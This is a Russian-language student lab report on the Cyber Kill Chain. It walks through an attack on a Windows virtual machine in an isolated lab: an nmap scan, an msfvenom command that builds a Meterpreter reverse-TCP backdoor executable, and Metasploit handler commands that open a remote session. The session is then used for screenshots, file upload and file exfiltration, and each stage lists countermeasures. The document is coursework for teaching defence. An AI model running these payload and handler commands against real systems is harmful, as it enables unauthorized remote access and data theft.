# Лабораторная работа 6
**Работу выполнили Дзюба Д.В и Алиев С.Г**

---

## 1. Теоретическая часть

Kill Chain (Цепочка уничтожения) — это модель, описывающая последовательные этапы кибератаки от первоначального сбора информации о цели до достижения конечной цели злоумышленника. Классическая модель Cyber Kill Chain была разработана компанией Lockheed Martin и включает в себя 7 этапов.
Основная идея модели заключается в том, что сложная кибератака представляет собой не одно действие, а цепочку взаимосвязанных шагов. Если защитная сторона сможет обнаружить и прервать атаку на любом этапе, то вся атака будет сорвана либо существенно усложнена и удорожена для злоумышленника.
Модель Kill Chain широко используется как при проектировании систем защиты (Defense in Depth), так и при расследовании инцидентов информационной безопасности.

Классическая модель Cyber Kill Chain состоит из следующих этапов:

+ 1. Разведка 

+ 2. Создание оружия 

+ 3. Доставка 

+ 4. Эксплуатация 

+ 5. Установка 

+ 6. C2 Командование и управление

+ 7. Действия по  цели


 --- 
 
## Практическая часть

**Будем использовать режим внутренней сети на виртуалках и ля начала выдадим машинам IP-адреса**

![выданные IP-адреса](https://github.com/Corleone-Inc/lab6/blob/main/images_6/ip_adresses.jpg)

### Этап 1: Разведка (Reconnaissance)

**Цель этапа:**
Сбор информации о целевой системе для определения возможных векторов атаки

Для этого этапа нам понадобится kali linux. Установим его как виртуальную машину
Откроем терминал просканируем порты на целевой машине(windows) Это нужно нам для того, чтобы найти слабые места, т.е чтобы определить вектор атаки.
для этого будем использовать инструмент nmap 
`nmap -sV 192.168.0.10`

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/nmap_kali.jpg" width="800" height="600">

**Контрмеры**

* Отключение и блокировка сетевых сервисов, которые не используются в работе системы

* Применение межсетевых экранов для ограничения несанкционированного сетевого доступа

* Использование IDS/IPS для выявления сетевого сканирования

* Ограничение ответов на ICMP-запросы

* Периодическая проверка конфигурации сети и активных сервисов
  
### Этап 2: Создание оружия (Weaponization)

**Цель этапа:**
Создание вредоносной программы с полезной нагрузкой для удалённого доступа к системе жертвы.

Для создания вредоносного исполняемого файла была использована утилита `msfvenom`
Используем следующую команду
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP-адрес Kali> LPORT=4444 -f exe > payload.exe.`

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/make_payload.jpg" width="800" height="600">

Здесь мы создаем исполняемый файл с расширением exe. После его запуска создается бэкдор reverce_tcp подключенный на указанный адрес и порт

**Контрмеры**
* Использование антивирусного ПО с поддержкой поведенческого и эвристического анализа

* Применение EDR/XDR-платформ для обнаружения подозрительных исполняемых файлов

* Запрет запуска неизвестных и неподписанных программ

* Использование списков разрешённых приложений и контроль целостности программного обеспечения

### Этап 3: Доставка (Delivery)

**Цель этапа:**
Доставка вредоносного файла на компьютер жертвы.

В ходе лабораторной допускается простой перенос файла через общие папки, но существует огромное множество способов сделать это. 
В реальной практике наиболее часто встречаются способы передачи через электронную почту, в виде ссылки или документа
Мы решили использовать python сервер на 80 порту

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/Kali_server.jpg" width="800" height="600">

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/take_virus.jpg" width="800" height="600">

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/virus_on_virt.jpg" width="800" height="600">
**Контрмеры**

* Фильтрация входящей почты с применением антифишинговых и антивирусных механизмов

* Проверка файлов, получаемых по различным каналам передачи(с других носителей или скачанные из интернета)

* Ограничение возможностей пользователей по передаче и загрузке исполняемых файлов

* Проведение обучения сотрудников по вопросам фишинга и социальной инженерии

* Применение DLP-средств для контроля перемещения файлов и данных

### Этап 4: Эксплуатация (Exploitation) и Этап 5: Установка (Installation)

**Цель этапов:**
Запуск вредоносного кода на системе жертвы и получение удалённого доступа.

Настроим инструмент `msfconsole` , для того чтобы он ожидал соединение, спровоцированное полезной нагрузкой вредоносного файла на винде

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/start_metasploit.jpg" width="800" height="600">

Запускаем msfconcole и делаем настройку обработчика при помощи следующих команд:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP-адрес Kali>
set LPORT 4444
exploit

```
<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/start_exploit.jpg" width="800" height="600">

После того как жертва запустит вредоносный файл - запустится сессия

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/success_session.jpg" width="800" height="600">



**Контрмеры для защиты от эксплуатации**
* Своевременная установка обновлений безопасности для операционных систем и программ

* Работа пользователей без прав администратора

* Использование встроенных механизмов защиты от эксплуатации уязвимостей

* Отключение макросов и активного содержимого в офисных документах

**Контрмеры для защиты от эксплуатации** 

* Отслеживание изменений в механизмах автозапуска операционной системы

* Контроль модификаций системных файлов, каталогов и веток реестра

* Использование средств класса EDR для выявления попыток закрепления вредоносного ПО

* Ограничение прав записи в критически важные директории системы

### Этап 6: Установление командования и установки

**Цель этапа:**
Подтвердить наличие устойчивого канала связи между атакующей машиной и жертвой.

Для проверки выполним команды для сбора информации о характеристиках системы

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/sysinfo.jpg" width="800" height="600">

**Контрмеры**

+ Фильтрация исходящего сетевого трафика с использованием межсетевых экранов

+ Ограничение внешних сетевых подключений по принципу минимально необходимого

+ Мониторинг и анализ сетевой активности с применением средств сбора логов, например, SIEM

+ Блокировка сетевых соединений с неизвестными и подозрительными IP-адресами

+ Использование DNS-фильтрации и прокси-серверов

### Этап 7: Действия по достижению цели (Actions on Objectives)

**Цель этапа:**
Демонстрация возможностей злоумышленника после компрометации системы.

Сделаем снимок экрана жертвы

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/screenshot.jpg" width="800" height="600">

Затем откроем командную строку и для примера проверим сетевые интерфейсы - видим ip адрес жертвы

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/show_shell.jpg" width="800" height="600">

теперь загрузим файл на машину жертвы

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/upload.jpg" width="800" height="600">

Проверим загруженный файл - файл успешно загрузился

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/upload_win.jpg" width="800" height="600">

Следующий шаг - скачаем файл с зараженной машины
создадим файл, который будем скачивать. Вот его содержимое

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/sercet.jpg" width="800" height="600">

и теперь на kali скачаем его

<img src="https://github.com/Corleone-Inc/lab6/blob/main/images_6/download_file.jpg" width="800" height="600">



**Контрмеры**
* Ограничение доступа к конфиденциальным файлам и контроль операций с ними

* Использование систем предотвращения утечек данных(DLP)

* Контроль использования средств удалённого управления и командных оболочек

* Регулярный анализ журналов событий безопасности

* Оперативная изоляция заражённой системы при выявлении компрометации

---
